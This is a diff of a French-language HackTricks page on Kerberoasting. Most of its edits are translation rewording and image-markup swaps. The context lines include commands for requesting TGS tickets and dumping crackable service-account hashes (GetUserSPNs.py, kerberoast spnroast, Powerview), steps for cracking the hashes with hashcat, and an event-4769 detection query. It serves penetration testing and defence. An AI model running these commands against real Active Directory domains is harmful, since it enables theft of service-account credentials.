@@ -1,6 +1,6 @@
 # Kerberoast
 
-![](<../../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
@@ -23,7 +23,7 @@ Obtenez un accès aujourd'hui :
 ## Kerberoast
 
 L'objectif de **Kerberoasting** est de collecter des **tickets TGS pour les services qui s'exécutent au nom des comptes d'utilisateurs** dans l'AD, et non des comptes d'ordinateurs. Ainsi, **une partie** de ces tickets TGS est **cryptée** avec des **clés** dérivées des mots de passe des utilisateurs. Par conséquent, leurs informations d'identification peuvent être **craquées hors ligne**.\
-Vous pouvez savoir qu'un **compte utilisateur** est utilisé comme **service** car la propriété **"ServicePrincipalName"** n'est **pas nulle**.
+Vous pouvez savoir qu'un **compte utilisateur** est utilisé comme **service** car la propriété **"ServicePrincipalName"** n'est pas nulle.
 
 Par conséquent, pour effectuer Kerberoasting, seul un compte de domaine qui peut demander des TGS est nécessaire, ce qui peut être n'importe qui car aucun privilège spécial n'est requis.
 
@@ -32,7 +32,7 @@ Par conséquent, pour effectuer Kerberoasting, seul un compte de domaine qui peu
 ### **Attaque**
 
 {% hint style="warning" %}
-Les outils de **Kerberoasting** demandent généralement le **chiffrement RC4** lors de l'exécution de l'attaque et de l'initiation des demandes TGS-REQ. Cela est dû au fait que **RC4 est** [**plus faible**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) et plus facile à craquer hors ligne à l'aide d'outils tels que Hashcat que d'autres algorithmes de chiffrement tels que AES-128 et AES-256.\
+Les outils de **Kerberoasting** demandent généralement **le chiffrement RC4** lors de l'exécution de l'attaque et de l'initiation des demandes TGS-REQ. Cela est dû au fait que **RC4 est** [**plus faible**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) et plus facile à craquer hors ligne à l'aide d'outils tels que Hashcat que d'autres algorithmes de chiffrement tels que AES-128 et AES-256.\
 Les hachages RC4 (type 23) commencent par **`$krb5tgs$23$*`** tandis que les hachages AES-256 (type 18) commencent par **`$krb5tgs$18$*`**.
 {% endhint %}
 
@@ -47,7 +47,7 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-Outils multi-fonctionnalités comprenant un dump des utilisateurs pouvant être kerberoastés :
+Outils multi-fonctionnalités incluant un dump des utilisateurs pouvant être kerberoastés :
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
@@ -65,14 +65,12 @@ Get-NetUser -SPN | select serviceprincipalname #Powerview
 
 Dans cette technique, nous allons demander un Service Ticket (TGS) à un contrôleur de domaine et le récupérer depuis la mémoire d'un utilisateur cible. Le TGS contient le hash du mot de passe du compte de service, que nous pourrons ensuite casser hors ligne.
 
-Voici les étapes à suivre :
-
-1. Identifiez un compte de service vulnérable dans l'Active Directory.
-2. Utilisez l'outil `GetUserSPNs.py` pour demander un TGS pour le compte de service. Cet outil est disponible dans le cadre de l'outil Impacket.
+1. Identifiez un compte de service vulnérable dans Active Directory.
+2. Utilisez l'outil `GetUserSPNs.py` pour demander un TGS pour le compte de service vulnérable.
 3. Une fois que vous avez obtenu le TGS, utilisez l'outil `kirbi2john.py` pour extraire le hash du mot de passe du TGS.
-4. Utilisez un outil de craquage de mots de passe, tel que Hashcat, pour casser le hash du mot de passe et récupérer le mot de passe en clair.
+4. Utilisez un outil de cassage de mots de passe, comme `hashcat`, pour casser le hash du mot de passe et récupérer le mot de passe en clair.
 
-Il est important de noter que cette technique nécessite des privilèges d'administrateur sur le contrôleur de domaine pour demander le TGS. De plus, vous devez avoir un accès en lecture à la mémoire de l'utilisateur cible pour extraire le TGS.
+Cette technique est efficace pour récupérer les mots de passe des comptes de service vulnérables dans Active Directory. Assurez-vous d'avoir les autorisations nécessaires pour effectuer ces actions.
 ```powershell
 #Get TGS in memory from a single user
 Add-Type -AssemblyName System.IdentityModel
@@ -114,11 +112,11 @@ Lorsqu'un TGS est demandé, l'événement Windows `4769 - Une demande de ticket 
 
 
 
-![](<../../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
-Obtenez un accès aujourd'hui :
+Obtenez un accès dès aujourd'hui :
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -171,7 +169,7 @@ Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{
 
 </details>
 
-![](<../../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
